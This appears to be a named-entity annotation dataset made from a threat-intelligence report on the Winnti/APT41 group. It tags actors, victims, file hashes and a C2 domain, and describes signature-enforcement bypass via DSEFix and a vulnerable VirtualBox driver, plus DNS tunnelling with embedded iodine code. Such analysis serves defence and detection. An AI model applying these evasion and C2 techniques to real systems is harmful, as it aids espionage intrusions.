WINNTI GROUP_ Insights From the Past,WINNTI,threat_actor
WINNTI GROUP_ Insights From the Past,"-related attack components, and the targeting of a previously-unreported
South Korean video game company.
The sophistication of the techniques we uncovered confirms that the ",O
WINNTI GROUP_ Insights From the Past,WINNTI,threat_actor
WINNTI GROUP_ Insights From the Past," Group is a
highly sophisticated, and highly committed Advanced Persistent Group  targeting a plethora
of different industry sectors in ",O
WINNTI GROUP_ Insights From the Past,Europe,country
WINNTI GROUP_ Insights From the Past, and ,O
WINNTI GROUP_ Insights From the Past,South Asia,country
WINNTI GROUP_ Insights From the Past,".

Introduction
The ",O
WINNTI GROUP_ Insights From the Past,WINNTI,threat_actor
WINNTI GROUP_ Insights From the Past, Group (also known as ,O
WINNTI GROUP_ Insights From the Past,APT41,threat_actor
WINNTI GROUP_ Insights From the Past,", ",O
WINNTI GROUP_ Insights From the Past,BARIUM,threat_actor
WINNTI GROUP_ Insights From the Past,", and ",O
WINNTI GROUP_ Insights From the Past,Blackfly,threat_actor
WINNTI GROUP_ Insights From the Past,") is an alleged Chinese state-
sponsored umbrella organization in China’s intelligence branch linked through their use of shared
goals and attack resources. The suspected state-sponsor link to China’s government pinpoints
that it likely has an incentive to continue targeting a variety of industries, especially one’s
highlighted as priority for China’s economic development.

On ",O
WINNTI GROUP_ Insights From the Past,"Friday, 13 January",timestamp
WINNTI GROUP_ Insights From the Past,", ",timestamp
WINNTI GROUP_ Insights From the Past,QuoIntelligence,org
WINNTI GROUP_ Insights From the Past, (,O
WINNTI GROUP_ Insights From the Past,QuoINT,org
WINNTI GROUP_ Insights From the Past,) detected a new ,O
WINNTI GROUP_ Insights From the Past,WINNTI,threat_actor
WINNTI GROUP_ Insights From the Past," sample uploaded to a
public virus scanner from a German location. Following our preliminary analysis, we assessed
with high confidence that the sample was used to target a previously unreported German

https://quointelligence.eu/2020/04/WINNTI-group-insights-from-the-past/
https://www.tagesschau.de/investigativ/ndr/hackerangriff-chemieunternehmen-101.html
https://github.com/yarrick/iodine


4/21/2020 ",O
WINNTI GROUP_ Insights From the Past,WINNTI,threat_actor
WINNTI GROUP_ Insights From the Past, GROUP: Insights From the Past — ,O
WINNTI GROUP_ Insights From the Past,QuoIntelligence,org
WINNTI GROUP_ Insights From the Past," - Our Finished Intelligence, Tailor-made for Your Organization

https://quointelligence.eu/2020/04/WINNTI-group-insights-from-the-past/ 2/13

chemical company. Additionally, during our analysis we uncovered a previously unknown stolen
digital certificate being used to digitally sign ",O
WINNTI GROUP_ Insights From the Past,WINNTI,threat_actor
WINNTI GROUP_ Insights From the Past," related drivers, and a potential campaign
against an already known South Korean video game company. 

In the last year, researchers and journalists have publicly disclosed that the ",O
WINNTI GROUP_ Insights From the Past,WINNTI,threat_actor
WINNTI GROUP_ Insights From the Past," group targeted
and eventually compromised ",O
WINNTI GROUP_ Insights From the Past,Henkel,org
WINNTI GROUP_ Insights From the Past," (2014), ",O
WINNTI GROUP_ Insights From the Past,BASF,org
WINNTI GROUP_ Insights From the Past," (2015), ",O
WINNTI GROUP_ Insights From the Past,Bayer,org
WINNTI GROUP_ Insights From the Past, (2018) and ,O
WINNTI GROUP_ Insights From the Past,Roche,org
WINNTI GROUP_ Insights From the Past," (2019). This
most recent previously unreported German chemical company is yet another German chemical
company targeted by ",O
WINNTI GROUP_ Insights From the Past,WINNTI,threat_actor
WINNTI GROUP_ Insights From the Past," since 2015. Prior to our analysis this attack activity was not publicly
reported.

Figure 1: Timeline of attacks located in Germany and attributed to ",O
WINNTI GROUP_ Insights From the Past,WINNTI,threat_actor
WINNTI GROUP_ Insights From the Past,"

In ",O
WINNTI GROUP_ Insights From the Past,December 2019,timestamp
WINNTI GROUP_ Insights From the Past,", ",O
WINNTI GROUP_ Insights From the Past,Germany’s Federal Office for the Protection of the Constitution,org
WINNTI GROUP_ Insights From the Past," (BfV) released
a report related to the alleged Chinese state sponsored umbrella organization known as the
",O
WINNTI GROUP_ Insights From the Past,WINNTI,threat_actor
WINNTI GROUP_ Insights From the Past," Group. Through our internal malware analysis, we are confident that the sample we
discovered is highly similar to the ",O
WINNTI GROUP_ Insights From the Past,WINNTI,threat_actor
WINNTI GROUP_ Insights From the Past," sample described in the BfV report. The sample also
matches known characteristics of ",O
WINNTI GROUP_ Insights From the Past,WINNTI,threat_actor
WINNTI GROUP_ Insights From the Past,"’s arsenal shared through intelligence reports produced
by ",O
WINNTI GROUP_ Insights From the Past,ESET,org
WINNTI GROUP_ Insights From the Past,".

Further, we have informed the affected company, law enforcement agencies, and sent a Warning
to our customers upon detection.

The ",O
WINNTI GROUP_ Insights From the Past,WINNTI,threat_actor
WINNTI GROUP_ Insights From the Past," Group
The ",O
WINNTI GROUP_ Insights From the Past,WINNTI,threat_actor
WINNTI GROUP_ Insights From the Past, Group (also known as ,O
WINNTI GROUP_ Insights From the Past,APT41,threat_actor
WINNTI GROUP_ Insights From the Past,", ",O
WINNTI GROUP_ Insights From the Past,BARIUM,threat_actor
WINNTI GROUP_ Insights From the Past,", and ",O
WINNTI GROUP_ Insights From the Past,Blackfly,threat_actor
WINNTI GROUP_ Insights From the Past,") is an alleged Chinese state-
sponsored umbrella organization in China’s intelligence branch linked through their use of shared
goals and attack resources. Notably, various operations attributed to other China-linked threat
actor groups, such as ",O
WINNTI GROUP_ Insights From the Past,APT17,threat_actor
WINNTI GROUP_ Insights From the Past, and ,O
WINNTI GROUP_ Insights From the Past,Ke3chang,threat_actor
WINNTI GROUP_ Insights From the Past,", have also leveraged its backdoor malware. Active
since at least 2010, initial attacks attributed to the group heavily targeted the gaming industry.
However, as researchers have continued to follow and dissect the group and its activity, the
group’s target focus has expanded to other industries, including ",O
WINNTI GROUP_ Insights From the Past,chemical,industry
WINNTI GROUP_ Insights From the Past,", ",O
WINNTI GROUP_ Insights From the Past,pharmaceutical,industry
WINNTI GROUP_ Insights From the Past,",
",O
WINNTI GROUP_ Insights From the Past,technology,industry
WINNTI GROUP_ Insights From the Past,", and ",O
WINNTI GROUP_ Insights From the Past,software,industry
WINNTI GROUP_ Insights From the Past,". Further, the group’s evolution involves the ",O
WINNTI GROUP_ Insights From the Past,enhancement,industry
WINNTI GROUP_ Insights From the Past,", ",O
WINNTI GROUP_ Insights From the Past,development,industry
WINNTI GROUP_ Insights From the Past,",
and inclusion of new tools and tactics.

The suspected state-sponsor link to ",O
WINNTI GROUP_ Insights From the Past,China’s government,org
WINNTI GROUP_ Insights From the Past,", pinpoints that it likely has an incentive
to continue targeting a variety of industries, especially one’s highlighted as priority for China’s
economic development. In the latest ",O
WINNTI GROUP_ Insights From the Past,WINNTI,threat_actor
WINNTI GROUP_ Insights From the Past," Group public report, ",O
WINNTI GROUP_ Insights From the Past,FireEye,org
WINNTI GROUP_ Insights From the Past," researchers reported of

https://www.verfassungsschutz.de/download/broschuere-2019-12-bfv-cyber-brief-2019-01.pdf
https://www.welivesecurity.com/wp-content/uploads/2019/10/ESET_",O
WINNTI GROUP_ Insights From the Past,WINNTI,threat_actor
WINNTI GROUP_ Insights From the Past,".pdf
https://www.fireeye.com/blog/threat-research/2020/03/",O
WINNTI GROUP_ Insights From the Past,APT41,threat_actor
WINNTI GROUP_ Insights From the Past,"-initiates-global-intrusion-campaign-using-multiple-exploits.html


4/21/2020 ",O
WINNTI GROUP_ Insights From the Past,WINNTI,threat_actor
WINNTI GROUP_ Insights From the Past, GROUP: Insights From the Past — ,O
WINNTI GROUP_ Insights From the Past,QuoIntelligence,org
WINNTI GROUP_ Insights From the Past," - Our Finished Intelligence, Tailor-made for Your Organization

https://",O
WINNTI GROUP_ Insights From the Past,QuoIntelligence,org
WINNTI GROUP_ Insights From the Past,.eu/2020/04/,O
WINNTI GROUP_ Insights From the Past,WINNTI,threat_actor
WINNTI GROUP_ Insights From the Past,"-group-insights-from-the-past/ 3/13

a new widespread campaign attributed to ",O
WINNTI GROUP_ Insights From the Past,APT41,threat_actor
WINNTI GROUP_ Insights From the Past," which involves exploitation attempts of recently
disclosed and patched vulnerabilities for products of ",O
WINNTI GROUP_ Insights From the Past,Cisco,org
WINNTI GROUP_ Insights From the Past,", ",O
WINNTI GROUP_ Insights From the Past,Citrix,org
WINNTI GROUP_ Insights From the Past,", and ",O
WINNTI GROUP_ Insights From the Past,Zoho,org
WINNTI GROUP_ Insights From the Past,". The campaign
waves apparently take a more targeted approach to selecting potential victims across various
sectors including ",O
WINNTI GROUP_ Insights From the Past,financials,industry
WINNTI GROUP_ Insights From the Past,", ",O
WINNTI GROUP_ Insights From the Past,government,industry
WINNTI GROUP_ Insights From the Past,", and ",O
WINNTI GROUP_ Insights From the Past,information technology,industry
WINNTI GROUP_ Insights From the Past,". According to the
researchers, identified victim systems demonstrated the threat actor leveraged commercially
available post exploitation tools such as ",O
WINNTI GROUP_ Insights From the Past,Cobalt Strike,malware
WINNTI GROUP_ Insights From the Past, and ,O
WINNTI GROUP_ Insights From the Past,Meterpreter,malware
WINNTI GROUP_ Insights From the Past,", which are essentially full
featured backdoors.

Technical Analysis

Sample Targeting German Chemical Company
The main artifact uploaded to VirusTotal is a Dynamic Link Library (DLL) file, with a compilation
timestamp suggesting the sample was built in ",O
WINNTI GROUP_ Insights From the Past,>August 2015,timestamp
WINNTI GROUP_ Insights From the Past,". Although the compilation time might
be legitimate, it is not possible to determine when and how long the attackers used this malware.

HASHES Compilation

Timestamp

File‐
name

MD5: ",O
WINNTI GROUP_ Insights From the Past,c893a12ff72698f09f89f778e4c9cd2b,ioc
WINNTI GROUP_ Insights From the Past,"
SHA1: ",O
WINNTI GROUP_ Insights From the Past,06256946a69409cd18859bfa429184a282374d76,ioc
WINNTI GROUP_ Insights From the Past,"
SHA256:
",O
WINNTI GROUP_ Insights From the Past,df6af36626d375c5e8aff45c64bfc1975d753b109e126a6cb30ee0523550329c,ioc
WINNTI GROUP_ Insights From the Past,"

2015-08-06
01:52:51

",O
WINNTI GROUP_ Insights From the Past,TmPfw‐RVS.dll,malware
WINNTI GROUP_ Insights From the Past,"

Table 1 – ",O
WINNTI GROUP_ Insights From the Past,WINNTI,threat_actor
WINNTI GROUP_ Insights From the Past," sample

Binary Analysis

Similar to other ",O
WINNTI GROUP_ Insights From the Past,WINNTI,threat_actor
WINNTI GROUP_ Insights From the Past," samples, the configuration section contains a string referring to the name
of the campaign. In this case, at 0X020, the referred campaign name is the name of the chemical
company – redacted for the purposes of this blog.

Figure 2 – Extracted configuration from ",O
WINNTI GROUP_ Insights From the Past,WINNTI,threat_actor
WINNTI GROUP_ Insights From the Past," sample

The analysed artifact we observed contains the  following binaries listed below, and also aligns
with observations in the BfV report.

HASHES Compilation
Timestamp

Filename



4/21/2020 ",O
WINNTI GROUP_ Insights From the Past,WINNTI,threat_actor
WINNTI GROUP_ Insights From the Past, GROUP: Insights From the Past — ,O
WINNTI GROUP_ Insights From the Past,QuoIntelligence,org
WINNTI GROUP_ Insights From the Past," - Our Finished Intelligence, Tailor-made for Your Organization

https://quointelligence.eu/2020/04/WINNTI-group-insights-from-the-past/ 4/13

MD5: c893a12ff72698f09f89f778e4c9cd2b
SHA1:
06256946a69409cd18859bfa429184a282374d76
SHA256: 
df6af36626d375c5e8aff45c64bfc1975d753b109e126a6cb30ee0523550329c

2015-08-06
01:52:51

",O
WINNTI GROUP_ Insights From the Past,TmPfwRVS.dll,malware
WINNTI GROUP_ Insights From the Past,"

MD5: ",O
WINNTI GROUP_ Insights From the Past,cf140dc4cad9e8216545593a4c08c7be,ioc
WINNTI GROUP_ Insights From the Past,"

SHA1:
",O
WINNTI GROUP_ Insights From the Past,2b319b44451abb0596b9187e06f1fb7b4ace969d,ioc
WINNTI GROUP_ Insights From the Past,"

SHA256:
bfa8948f72061eded548ef683830de068e438a6eaf2da44e0398a37ac3e26860",O
WINNTI GROUP_ Insights From the Past,"

2015-08-05
12:08:00

",O
WINNTI GROUP_ Insights From the Past,driver1.sys,ioc
WINNTI GROUP_ Insights From the Past,"

MD5: ",O
WINNTI GROUP_ Insights From the Past,cc95391d75ce2443740f60114fe30ae9,ioc
WINNTI GROUP_ Insights From the Past,"

SHA1: ",O
WINNTI GROUP_ Insights From the Past,30d1dd1dd4f0ace7a4f2c24e31fb6a0ee33e8a3a,ioc
WINNTI GROUP_ Insights From the Past,"

SHA256:
",O
WINNTI GROUP_ Insights From the Past,8ddc6dd9fc3640cd786dfbc72212cd001d9369817aa69e0a2fa25e29560badcf,ioc
WINNTI GROUP_ Insights From the Past,"

2015-05-05
11:31:13

",O
WINNTI GROUP_ Insights From the Past,driver2.sys,ioc
WINNTI GROUP_ Insights From the Past,"

MD5: ",O
WINNTI GROUP_ Insights From the Past,b4e66b445b39d0368bbe4b91a3cd98ff,ioc
WINNTI GROUP_ Insights From the Past,"

SHA1:
",O
WINNTI GROUP_ Insights From the Past,2bc358ddc72f59ba0373b8635ab08ad747c12180,ioc
WINNTI GROUP_ Insights From the Past,"

SHA256:
",O
WINNTI GROUP_ Insights From the Past,1865013aaca0f12679e35f06c4dad4e00d6372415ee8390b17b4f910fee1f7a2,ioc
WINNTI GROUP_ Insights From the Past,"

2014-12-15
16:06:41

",O
WINNTI GROUP_ Insights From the Past,dsefix.exe,ioc
WINNTI GROUP_ Insights From the Past,"

MD5: ",O
WINNTI GROUP_ Insights From the Past,eaea9ccb40c82af8f3867cd0f4dd5e9d,ioc
WINNTI GROUP_ Insights From the Past,"

SHA1:
",O
WINNTI GROUP_ Insights From the Past,7c1b25518dee1e30b5a6eaa1ea8e4a3780c24d0c,ioc
WINNTI GROUP_ Insights From the Past,"

SHA256:
",O
WINNTI GROUP_ Insights From the Past,cf3a7d4285d65bf8688215407bce1b51d7c6b22497f09021f0fce31cbeb78986,ioc
WINNTI GROUP_ Insights From the Past,"

2008-May-31
02:18:53 UTC

",O
WINNTI GROUP_ Insights From the Past,vbox‐drv.sys,ioc
WINNTI GROUP_ Insights From the Past,"

Table 2 – Additional artifacts contained by
",O
WINNTI GROUP_ Insights From the Past,bfa8948f72061eded548ef683830de068e438a6eaf2da44e0398a37ac3e26860,ioc
WINNTI GROUP_ Insights From the Past,"

Analysis of ",O
WINNTI GROUP_ Insights From the Past,dsefix.exe,ioc
WINNTI GROUP_ Insights From the Past,"

This is essentially Windows x64 Driver Signature Enforcement Overrider (DSEFix), used   to
temporarily disable the driver signature enforcement on Windows systems by using an included
old, legit VirtualBox driver, both signed and exploitable. By running dsefix.exe, the malware can

https://github.com/hfiref0x/DSEFix


4/21/2020 ",O
WINNTI GROUP_ Insights From the Past,WINNTI,threat_actor
WINNTI GROUP_ Insights From the Past, GROUP: Insights From the Past — ,O
WINNTI GROUP_ Insights From the Past,QuoIntelligence,org
WINNTI GROUP_ Insights From the Past," - Our Finished Intelligence, Tailor-made for Your Organization

https://quointelligence.eu/2020/04/WINNTI-group-insights-from-the-past/ 5/13

bypass driver verification and install its own drivers. We identified the following two drivers which
were embedded in the earlier described main artifact. To note that this technique does not work
on moden Windows (e.g. ",O
WINNTI GROUP_ Insights From the Past,Windows 10,software
WINNTI GROUP_ Insights From the Past,") – yet another piece of evidence that this malware was
designed and used multiple years ago.

Analysis of vboxdriver

This is the vulnerable, correctly signed with a digital certificate, ",O
WINNTI GROUP_ Insights From the Past,VirtualBox,software
WINNTI GROUP_ Insights From the Past," driver that is used for
exploitation. It is used regularly by various threat actors, and by the previously highlighted
dsefix.exe. The driver can also be used to perform the Turla Driver Loader (TDL) exploitation
technique, a similar technique as DSEFix.

Analysis of driver1.sys

In late 2019, ",O
WINNTI GROUP_ Insights From the Past,ExaTrack,org
WINNTI GROUP_ Insights From the Past, released their analysis of a signed ,O
WINNTI GROUP_ Insights From the Past,WINNTI,threat_actor
WINNTI GROUP_ Insights From the Past," rootkit previously observed in
the wild, which we confirm is essentially the same rootkit driver.  The sample is capable of
injecting raw packets into the network and receiving special formatted packets. In comparison,
our variant has the same exact number of bytes, and there are large parts exactly matching.

Analysis of driver2.sys

This rootkit driver seems to be largely the same as driver1.sys with the same characteristics
including structure, I/O control, and device strings. However, this driver supports different versions
of Windows. It checks for ranges of Windows New Technology (NT) build numbers and returns
early.

C2 DNS Tunneling

By analyzing the malware, it is possible to find two network indicators within its code:

Figure 3 – observed network IoCs in ",O
WINNTI GROUP_ Insights From the Past,WINNTI,threat_actor
WINNTI GROUP_ Insights From the Past," sample

The hardcoded 208.67.222.222 is a legitimate OpenDNS DNS server (resolver1.opendns.com).
This IP is pushed into a list that is generated by the malware at runtime. Likely, the initiation
routine also populates the list with the system’s DNS, and the OpenDNS server is only used as
fallback case to ensure the C2 domain gets resolved.

The dick[.]mooo[.]com FQDN name is offered by FreeDNS, which is a free dynamic DNS service.
Notably, in the last years, multiple researchers have reported ",O
WINNTI GROUP_ Insights From the Past,WINNTI,threat_actor
WINNTI GROUP_ Insights From the Past,"/PlugX C2 hostnames hosted
in the mooo[.]com zone. In the code we observed that a dot (.) is enforced before the FQDN.
Additional analysis revealed that the malware generates subdomains with base128 encoding, and
append them to FQDN. 

https://github.com/hfiref0x/TDL
https://exatrack.com/public/WINNTI_EN.pdf
https://freedns.afraid.org/


4/21/2020 ",O
WINNTI GROUP_ Insights From the Past,WINNTI,threat_actor
WINNTI GROUP_ Insights From the Past, GROUP: Insights From the Past — ,O
WINNTI GROUP_ Insights From the Past,QuoIntelligence,org
WINNTI GROUP_ Insights From the Past," - Our Finished Intelligence, Tailor-made for Your Organization

https://",O
WINNTI GROUP_ Insights From the Past,QuoIntelligence,org
WINNTI GROUP_ Insights From the Past,.eu/2020/04/,O
WINNTI GROUP_ Insights From the Past,WINNTI,threat_actor
WINNTI GROUP_ Insights From the Past,"-group-insights-from-the-past/ 6/13

Code 1 – Hostname length restriction

Further, dots are added into it every 57 characters potentially as a hostname length restriction,
suggesting the expectation of long hostnames. We confirm the buffer can support FQDN’s up to
2000 characters.

Upon further investigation we found out that the malware includes the open source iodine source
code – software that enables the tunneling of IPv4 data through a DNS server. Interestingly, we
are not aware of any earlier documentation highlighting ",O
WINNTI GROUP_ Insights From the Past,WINNTI,threat_actor
WINNTI GROUP_ Insights From the Past," specifically leveraging iodine for
DNS tunneling. However, researchers at the Ruhr University Bochum, while hunting for DNS
tunnels, observed ",O
WINNTI GROUP_ Insights From the Past,APT32,threat_actor
WINNTI GROUP_ Insights From the Past, and ,O
WINNTI GROUP_ Insights From the Past,Wekby,threat_actor
WINNTI GROUP_ Insights From the Past," APT groups using NULL and TXT records as a C2
communication channel, as well as mentioning the mooo[.]com top level domain in their findings.

The implementation of iodine used in the ",O
WINNTI GROUP_ Insights From the Past,WINNTI,threat_actor
WINNTI GROUP_ Insights From the Past," sample is integrated and uses some custom
wrapper, as evidence by the matching functions we discuss in further detail in the following
section.

Use of Iodine for C2 DNS Tunneling

The iodine DNS tunneling solution is embedded in the DLL that is initially loaded and executed in
memory, and includes at least the following 15 matching functions:

Table 3 – Malware DLL Functions

For instance, the 64bit executable contains the build_hostname function (Code 2), which
corresponds with the older 32bit version (compiled with debug symbols) of iodine 0.6.0 (Code 3):

https://github.com/yarrick/iodine
https://www.farsightsecurity.com/assets/documents/A_Study_of_Newly_Observed_Hostnames_and_DNS_Tunneling_in_the_Wild.pdf


4/21/2020 ",O
WINNTI GROUP_ Insights From the Past,WINNTI,threat_actor
WINNTI GROUP_ Insights From the Past, GROUP: Insights From the Past — ,O
WINNTI GROUP_ Insights From the Past,QuoIntelligence,org
WINNTI GROUP_ Insights From the Past," - Our Finished Intelligence, Tailor-made for Your Organization

https://",O
WINNTI GROUP_ Insights From the Past,QuoIntelligence,org
WINNTI GROUP_ Insights From the Past,.eu/2020/04/,O
WINNTI GROUP_ Insights From the Past,WINNTI,threat_actor
WINNTI GROUP_ Insights From the Past,"-group-insights-from-the-past/ 7/13

Code 2- iodine_0-6-0_build_hostname

Code 3- iodine_0-6-0_build_hostname

Based on the presence of the functions base128_blksize_enc and base128_blksize_raw, we
determined the version used, while not exactly known, is from before May 2017 when a patch
removed those functions. Further, comparative analysis indicates that for the implementation of
iodine in this ",O
WINNTI GROUP_ Insights From the Past,WINNTI,threat_actor
WINNTI GROUP_ Insights From the Past," attack operation, there is no perfect match for the two versions having 64bit
pre-compiled binaries. This indicates iodine was compiled from source, and it is reasonable it is
being used as a library, and not in its normal distribution format of a standalone executable.



4/21/2020 ",O
WINNTI GROUP_ Insights From the Past,WINNTI,threat_actor
WINNTI GROUP_ Insights From the Past, GROUP: Insights From the Past — ,O
WINNTI GROUP_ Insights From the Past,QuoIntelligence,org
WINNTI GROUP_ Insights From the Past," - Our Finished Intelligence, Tailor-made for Your Organization

https://quointelligence.eu/2020/04/WINNTI-group-insights-from-the-past/ 8/13

The DNS Tunneling technique adopted by the malware through the use of iodine is detailed in the
figure below.

Figure 4 – C2 channel over DNS

1. The malware generates a hostname and appends it to the embedded C2
",O
WINNTI GROUP_ Insights From the Past,dick[.]mooo[.]com,ioc
WINNTI GROUP_ Insights From the Past,", and makes a NULL query to the resulted FQDN (e.g. abcde is appended
to ",O
WINNTI GROUP_ Insights From the Past,dick[.]mooo[.]com),ioc
WINNTI GROUP_ Insights From the Past,". Notably, NULL and TXT DNS request types are iodine’s preferred
channels since they are “expected to provide the largest downstream bandwidth”. It is
hence not a coincidence that researchers at Ruhr University Bochum also observed an
extensive use of NULL request types for DNS Tunneling purposes in their research.

2. The infected host sends the DNS query to one of the DNS servers included in the list
populated at runtime, eventually to the OpenDNS fallback server. At this point the DNS
server executes a recursive DNS query by contacting the Name Servers (NS) of each zone,
until the Authoritative NS of ",O
WINNTI GROUP_ Insights From the Past,dick[.]mooo[.]com,ioc
WINNTI GROUP_ Insights From the Past," is obtained. To note, FreeDNS does provide
users the capability to delegate the authority of their subdomains to external NS. In the
described scenario, attackers delegated the NS of their subdomain to use their NS as a de-
facto C2 server.

3. The DNS server returns the authoritative answer by forwarding the content of the NULL
record type to the infected host. Notably, the legit DNS server acts as a proxy between the
infected host and the malicious server, by making impossible for defenders the application
of any filtering at the Network (L3) level.

The NULL DNS record type

The implementation of NULL type tunneling can be observed in the following excerpt taken while
reversing the malware:

https://github.com/yarrick/iodine


4/21/2020 ",O
WINNTI GROUP_ Insights From the Past,WINNTI,threat_actor
WINNTI GROUP_ Insights From the Past, GROUP: Insights From the Past — ,O
WINNTI GROUP_ Insights From the Past,QuoIntelligence,org
WINNTI GROUP_ Insights From the Past," - Our Finished Intelligence, Tailor-made for Your Organization

https://quointelligence.eu/2020/04/WINNTI-group-insights-from-the-past/ 9/13

The third argument when calling dns_encode shall be of the type “struct query”
from Iodine’s dns.c

According to common.h, “struct query” is defined as:

Since QUERY_NAME_SIZE equals to 512  (4
*128 – integers are 4 bytes) the query[128] call
obtained from the reversing activity is indeed
the DNS query type.

As noted, reversing activity detailed the
query[128] value to be 0xa. From
Iodine’s windows.h T_NULL is
DNS_TYPE_NULL

Finally, from Windows’s
documentation, DNS_TYPE_NULL is actually a
Windows constant equal to 0xa

https://github.com/yarrick/iodine/blob/27e5d6fadd997ff167c70a431d41adae26428d41/src/dns.c#L232
https://github.com/yarrick/iodine/blob/27e5d6fadd997ff167c70a431d41adae26428d41/src/common.h#L86
https://github.com/yarrick/iodine/blob/27e5d6fadd997ff167c70a431d41adae26428d41/src/windows.h#L39
https://docs.microsoft.com/en-us/windows/win32/dns/dns-constants


4/21/2020 ",O
WINNTI GROUP_ Insights From the Past,WINNTI,threat_actor
WINNTI GROUP_ Insights From the Past, GROUP: Insights From the Past — ,O
WINNTI GROUP_ Insights From the Past,QuoIntelligence,org
WINNTI GROUP_ Insights From the Past," - Our Finished Intelligence, Tailor-made for Your Organization

https://quointelligence.eu/2020/04/WINNTI-group-insights-from-the-past/ 10/13

",O
WINNTI GROUP_ Insights From the Past,WINNTI,threat_actor
WINNTI GROUP_ Insights From the Past," Signed Code With Digital Certificate from IQ Technology

During our analysis of the ",O
WINNTI GROUP_ Insights From the Past,WINNTI,threat_actor
WINNTI GROUP_ Insights From the Past," sample configured to target the German chemical company, our
comparative analysis of other ",O
WINNTI GROUP_ Insights From the Past,WINNTI,threat_actor
WINNTI GROUP_ Insights From the Past," related drivers revealed a digital certificate issued to IQ
Technology, a Taiwanese company producing Natural language processing (NLP) and Artificial
Intelligence (AI) software. The rootkit driver aligns with the already known driver1.sys. While it is a
known TTP that ",O
WINNTI GROUP_ Insights From the Past,WINNTI,threat_actor
WINNTI GROUP_ Insights From the Past," attributed attacks have involved stolen digital certificates for code signing
its malware components, the use of this certificate is not publicly discussed, except for a brief
report from a security researcher apparently associated with a Vietnamese security company.
Although the report is no longer online,  the discussed sample contains a compilation timestamp
of August 2015, which is the earliest one observed in the wild that we identified using this digital
certificate. At the time of analysis, the digital certificate was already revoked.

The sample’s structure, debug symbols, and explanatory debug messages included within
suggests it is highly likely be a development version. Additionally, the compilation timestamp
indicates the sample was created 20 minutes prior to the driver1.sys.  Both samples are highly
related, and its contents combined with the date of  analysis and reporting essentially solidify that
it existed in 2015; however, this does not necessarily corroborate to an attack timeframe.

Sample Targeting South Korean Gaming Company

HASHES Compilation
Timestamp

MD5: ",O
WINNTI GROUP_ Insights From the Past,00961922e22e6a5d30b1d6fbd667d3c4,ioc
WINNTI GROUP_ Insights From the Past,"

SHA1: ",O
WINNTI GROUP_ Insights From the Past,0fd54c26b593bd9e9218492d50d8873521c0ec0d,ioc
WINNTI GROUP_ Insights From the Past,"

SHA256:
",O
WINNTI GROUP_ Insights From the Past,4209b457f3b42dd2e1e119f2c9dd5b5fb1d063a77b49c7acbae89bbe4e284fb9,ioc
WINNTI GROUP_ Insights From the Past,"

2016-03-07
09:44:01

https://hybrid-analysis.com/sample/a5d6139921576c3aedfc64e2b37ae1a64f3160bd1bb70d4fc7fce956029e7d55?environmentId=2&lang=en


4/21/2020 ",O
WINNTI GROUP_ Insights From the Past,WINNTI,threat_actor
WINNTI GROUP_ Insights From the Past, GROUP: Insights From the Past — ,O
WINNTI GROUP_ Insights From the Past,QuoIntelligence,org
WINNTI GROUP_ Insights From the Past," - Our Finished Intelligence, Tailor-made for Your Organization

https://quointelligence.eu/2020/04/WINNTI-group-insights-from-the-past/ 11/13

Table 3 – observed network IoCs in ",O
WINNTI GROUP_ Insights From the Past,WINNTI,threat_actor
WINNTI GROUP_ Insights From the Past," sample

On 21 February, we detected the new submission of a 64-bit ",O
WINNTI GROUP_ Insights From the Past,WINNTI,threat_actor
WINNTI GROUP_ Insights From the Past," executable to a public online
malware scanning service. As multiple researchers have reported, ",O
WINNTI GROUP_ Insights From the Past,WINNTI,threat_actor
WINNTI GROUP_ Insights From the Past," operators embed the
name of their target directly into the malware, but in an obfuscated manner.

Binary Analysis

The sample resembles the ",O
WINNTI GROUP_ Insights From the Past,WINNTI,threat_actor
WINNTI GROUP_ Insights From the Past," Dropper Install.exe described by ESET, since it is a command
line executable used to drop and load additional encrypted payload:

Unfortunately we were not able to find the payload meant to be decrypted by this dropper.

However, we were able to extract the malware’s configuration file and identify the intended target.
In this case, the following string was included within the extracted configuration:

Based on previous knowledge and targeting of the ",O
WINNTI GROUP_ Insights From the Past,WINNTI,threat_actor
WINNTI GROUP_ Insights From the Past," Group, we assess that this sample was
likely used to target ",O
WINNTI GROUP_ Insights From the Past,"Gravity Co., Ltd.",org
WINNTI GROUP_ Insights From the Past,", a South Korean video game company. The company is
known for its Massive Multiplayer Online Role Playing Game (MMORPG) Ragnarok Online, which
is also offered as a mobile application. As we have also reported in the past, the video game
industry is one of the preferred targets of the ",O
WINNTI GROUP_ Insights From the Past,WINNTI,threat_actor
WINNTI GROUP_ Insights From the Past," Group, especially for those companies
operating in ",O
WINNTI GROUP_ Insights From the Past,South Korea,country
WINNTI GROUP_ Insights From the Past, and ,O
WINNTI GROUP_ Insights From the Past,Taiwan,country
WINNTI GROUP_ Insights From the Past,". Interestingly, ",O
WINNTI GROUP_ Insights From the Past,ESET,org
WINNTI GROUP_ Insights From the Past," researchers, while reporting on multiple
",O
WINNTI GROUP_ Insights From the Past,WINNTI,threat_actor
WINNTI GROUP_ Insights From the Past," Group campaigns targeting the video game industry, listed in their report a C2 server
having a Campaign ID GRA KR 0629.

Excerpt from ESET Research White paper “CONNECTING THE DOTS Exposing the arsenal and
methods of the ",O
WINNTI GROUP_ Insights From the Past,WINNTI,threat_actor
WINNTI GROUP_ Insights From the Past," Group”

At this time, we do not have any further evidence supporting a potential link between the sample
we analysed and the C2 detailed by ",O
WINNTI GROUP_ Insights From the Past,ESET,org
WINNTI GROUP_ Insights From the Past,", but the coincidence between the C2 Campaign
ID/Location with the Campaign ID we extracted from the ",O
WINNTI GROUP_ Insights From the Past,WINNTI,threat_actor
WINNTI GROUP_ Insights From the Past," dropper is worth noting.

Conclusion

http://www.gravity.co.kr/en/games/
https://www.welivesecurity.com/wp-content/uploads/2019/10/ESET_",O
WINNTI GROUP_ Insights From the Past,WINNTI,threat_actor
WINNTI GROUP_ Insights From the Past,".pdf


4/21/2020 ",O
WINNTI GROUP_ Insights From the Past,WINNTI,threat_actor
WINNTI GROUP_ Insights From the Past, GROUP: Insights From the Past — ,O
WINNTI GROUP_ Insights From the Past,QuoIntelligence,org
WINNTI GROUP_ Insights From the Past," - Our Finished Intelligence, Tailor-made for Your Organization

https://quointelligence.eu/2020/04/WINNTI-group-insights-from-the-past/ 12/13

The ",O
WINNTI GROUP_ Insights From the Past,WINNTI,threat_actor
WINNTI GROUP_ Insights From the Past," Group has exhibited their ability to breach different organizations and conduct
sophisticated attack operations, typically motivated by espionage and financial gain, with various
TTPs and malware toolkits. While attribution is not concrete due to the complexity of the group,
there are links that can be drawn between operations which suggest the threat actors purporting
the attacks are likely operating within the ",O
WINNTI GROUP_ Insights From the Past,WINNTI,threat_actor
